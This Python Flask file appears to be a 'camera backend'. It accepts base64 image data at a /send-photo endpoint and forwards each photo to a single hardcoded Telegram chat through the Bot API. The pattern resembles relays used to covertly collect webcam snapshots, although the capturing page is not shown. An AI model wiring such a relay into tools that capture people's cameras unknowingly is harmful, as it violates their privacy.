from flask import Flask, request, jsonify
import requests
import os
import base64

app = Flask(__name__)

BOT_TOKEN = os.environ["BOT_TOKEN"]
CHAT_ID = "8622456642"


@app.get("/")
def home():
    return "Camera backend is running."


@app.post("/send-photo")
def send_photo():
    try:
        data = request.get_json()

        if not data or "image" not in data:
            return jsonify({
                "ok": False,
                "error": "No image received"
            }), 400

        image = data["image"]

        if "," not in image:
            return jsonify({
                "ok": False,
                "error": "Invalid image format"
            }), 400

        encoded = image.split(",", 1)[1]
        image_bytes = base64.b64decode(encoded)

        telegram_url = (
            f"https://api.telegram.org/bot"
            f"{BOT_TOKEN}/sendPhoto"
        )

        response = requests.post(
            telegram_url,
            data={
                "chat_id": CHAT_ID
            },
            files={
                "photo": (
                    "camera.jpg",
                    image_bytes,
                    "image/jpeg"
                )
            },
            timeout=30
        )

        return jsonify(response.json())

    except Exception as e:
        return jsonify({
            "ok": False,
            "error": str(e)
        }), 500
